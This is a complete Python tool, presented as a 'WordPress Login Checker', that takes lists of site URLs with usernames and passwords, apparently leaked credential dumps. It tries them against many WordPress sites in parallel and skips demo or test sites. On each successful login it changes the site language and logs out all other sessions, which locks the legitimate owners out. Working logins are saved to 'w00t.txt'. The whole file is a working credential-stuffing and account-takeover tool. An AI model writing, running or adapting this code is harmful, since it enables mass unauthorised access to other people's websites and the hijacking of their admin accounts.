import os
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
from rich.console import Console
from rich.panel import Panel
from rich.markdown import Markdown
from rich.progress import Progress, TimeElapsedColumn, TimeRemainingColumn, BarColumn, TextColumn
from urllib.parse import urlparse
from datetime import datetime

console = Console()

# Clearing the screen based on the operating system
if os.name == "nt":  # Checking if the OS is Windows
    os.system("cls")  # Clearing the screen for a fresh start
    os.system("color a") # Set the green color text output 
else:
    os.system("clear")  # Clearing the screen for Unix-based systems

def read_credentials(file_path, filter_demo_test):
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
    except FileNotFoundError:
        console.print(f"[bold red]File not found: {file_path}[/bold red]")
        return None, 0
    
    # Remove duplicates while preserving order
    seen = set()
    unique_lines = []
    for line in lines:
        if line not in seen:
            seen.add(line)
            unique_lines.append(line)
    
    # Filter out lines containing 'demo' or 'test' if required
    if filter_demo_test:
        unique_lines = [line for line in unique_lines if 'demo' not in line.lower() and 'test' not in line.lower()]
    
    credentials = []
    for line in unique_lines:
        line = line.strip()
        if ':' in line and '@' in line:
            parts = line.split(':')
            if len(parts) == 3:
                url, username, password = parts
            else:
                continue
        elif ':' in line and '@' not in line:
            parts = line.split(':')
            if len(parts) == 3:
                url, username, password = parts
            else:
                continue
        elif '#' in line and '@' in line:
            url_part, cred_part = line.split('#', 1)  # Split only at the first occurrence of '#'
            url = url_part.replace('/wp-login.php', '')
            if '@' in cred_part:
                username, password = cred_part.split('@', 1)  # Split only at the first occurrence of '@'
            else:
                continue
        else:
            continue
        
        # Ensure the URL has a scheme
        parsed_url = urlparse(url)
        if not parsed_url.scheme:
            url = 'http://' + url
        credentials.append((url, username, password, line))
    
    return credentials, len(lines)

def check_login(url, username, password):
    try:
        login_url = f"{url}/wp-login.php"
        session = requests.Session()
        
        # Get the login page to retrieve cookies and any necessary hidden fields
        response = session.get(login_url, timeout=7)
        if 'wp-login.php' not in response.url:
            return 'Not a WordPress login page'
        
        # Prepare login data
        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f"{url}/wp-admin/",
            'testcookie': '1'
        }
        
        # Attempt to login
        response = session.post(login_url, data=login_data, timeout=7)
        
        # Check if login was successful
        if 'wp-admin' in response.url and 'wp-login.php' not in response.url:
            # Check if the background is not completely blank and no 403 Forbidden
            if response.status_code == 200 and '403 Forbidden' not in response.text:
                # Set language to English
                settings_url = f"{url}/wp-admin/options-general.php"
                settings_response = session.get(settings_url, timeout=7)
                if settings_response.status_code == 200 and 'General Settings' in settings_response.text:
                    language_data = {
                        'WPLANG': 'en_US',
                        'submit': 'Save Changes'
                    }
                    session.post(settings_url, data=language_data, timeout=7)
                
                # Check if pages and profile sections are accessible
                pages_response = session.get(f"{url}/wp-admin/edit.php?post_type=page", timeout=7)
                profile_response = session.get(f"{url}/wp-admin/profile.php", timeout=7)
                if pages_response.status_code == 200 and 'Pages' in pages_response.text and profile_response.status_code == 200:
                    # Log out from all other sessions
                    logout_response = session.post(f"{url}/wp-admin/profile.php", data={'action': 'log_out_everywhere_else'}, timeout=7)
                    if logout_response.status_code == 200:
                        return 'Success'
                    else:
                        return 'Failed to log out from other sessions'
                else:
                    return 'Login success but pages section not found'
            else:
                return 'Login success but access forbidden'
        elif 'wp-login.php' in response.url:
            return 'Bad credentials'
        else:
            return 'Unknown error during login'
    except requests.exceptions.Timeout:
        return 'Request timed out'
    except requests.exceptions.RequestException as e:
        return f'Network error'
    except Exception as e:
        return f'Unexpected error'

def main():
    parser = argparse.ArgumentParser(description='WordPress Login Checker')
    parser.add_argument('file', type=str, nargs='?', help='Path to the file containing URLs and credentials')
    parser.add_argument('--threads', type=int, default=50, help='Number of threads to use')
    args = parser.parse_args()
    
    while True:
        if not args.file:
            file_path = console.input("\n[bold yellow]Enter the path to the file containing URLs and credentials:[/bold yellow] ")
        else:
            file_path = args.file
        
        num_threads = console.input("[bold yellow]Enter the number of threads (default is 50) (50):[/bold yellow] ")
        num_threads = int(num_threads) if num_threads else 50
        
        filter_demo_test = console.input("[bold yellow]Filter out URLs containing 'demo' or 'test'? (yes/no) (yes):[/bold yellow] ")
        filter_demo_test = filter_demo_test.lower() in ['yes', 'y', '']
        
        credentials, total_lines = read_credentials(file_path, filter_demo_test)
        
        if credentials is not None:
            break
    
    # Save the cleaned and sorted credentials back to the file
    with open(file_path, 'w') as file:
        for _, _, _, line in credentials:
            file.write(f"{line}\n")
    
    console.print(f"\n[bold cyan]{total_lines - len(credentials)} identical strings have been removed from {file_path}.[/bold cyan]")
    console.print(f"[bold cyan]Number of lines left: {len(credentials)}[/bold cyan]\n")
    
    with Progress(
        TextColumn("[bold dark_violet]{task.fields[date_time]}[/bold dark_violet]"),
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.1f}%",
        "({task.completed}/{task.total})",
        TimeElapsedColumn(),
        TimeRemainingColumn(),
        console=console
    ) as progress:
        date_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        task = progress.add_task("[green]Checking logins...", total=len(credentials), date_time=date_time)
        
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_cred = {executor.submit(check_login, url, username, password): (url, username, original_line) for url, username, password, original_line in credentials}
            for future in as_completed(future_to_cred):
                url, username, original_line = future_to_cred[future]
                parsed_url = urlparse(url)
                raw_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                try:
                    result = future.result()
                    if result == 'Success':
                        console.print(f"[bold white][[bold green]w00t![bold white]]  [underline][bold medium_spring_green]{raw_url}[/underline] [bold green]{result}[/]")
                        with open('w00t.txt', 'a') as file:
                            file.write(f"{original_line}\n")
                    else:
                        console.print(f"[bold white][[bold red]FAILED[bold white]] [underline]{raw_url}[/underline] [bold yellow]{result}[/]")
                except Exception as exc:
                    console.print(f"[bold white][[bold red]FAILED[bold white]] [underline][bold red]{raw_url}[/underline] generated an exception: [bold yellow]{exc}[/]")
                progress.update(task, advance=1)

if __name__ == '__main__':
    banner = """
██████╗ ██████╗ ███████╗███████╗███████╗███████╗██████╗ 
██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔══██╗
██████╔╝██████╔╝█████╗  ███████╗███████╗█████╗  ██████╔╝
██╔═══╝ ██╔══██╗██╔══╝  ╚════██║╚════██║██╔══╝  ██╔══██╗
██║     ██║  ██║███████╗███████║███████║███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
"""
    console.print(Panel(banner, title="[bold yellow]WordPress Login Checker[/bold yellow]", subtitle="[bold cyan]Multi-threaded Login Attempt Script[/bold cyan]", expand=False, border_style="bold magenta"))

    description = """
    ## Script Features

    ● Multi-threaded Execution: Utilizes concurrent threads to speed up the login checking process.
    ● Credential Reading: Reads URLs and credentials from a specified file. Supports two formats:
       url:username:password
       url/wp-login.php#username@password
    ● Login Attempt: Attempts to log in to WordPress sites using the provided credentials.
    ● Result Logging: Logs successful login attempts to a file named `w00t.txt`.
    ● Interactive Mode: Prompts the user for inputs if arguments are not provided.
    ● Duplicate Removal: Removes duplicate lines from the input list and sorts them alphabetically.
    ● Filter Option: Option to filter out URLs containing 'demo' or 'test'.
    ● Progress Bar: Displays a progress bar with date, time, percentage of completion, and estimated remaining time.
    ● Language Setting: Sets the language to English during login.
    ● Session Logout: Logs out from all other sessions from the profile settings.
    ● General Settings Check: Checks for the existence of the /wp-admin/options-general.php path and ensures "General Settings" is present in the text.
    ● File Not Found Handling: If the input file is not found, the script restarts and prompts for the file path again.
    ● URL Scheme Handling: Ensures URLs have the correct scheme (http://) without duplicating it.

    ## Usage
    
    ● <file_path>: Path to the file containing URLs and credentials in the supported formats.
    ● --threads: (Optional) Number of threads to use for concurrent execution. Default is 50.
    """
    console.print(Markdown(description), justify="center")

    main()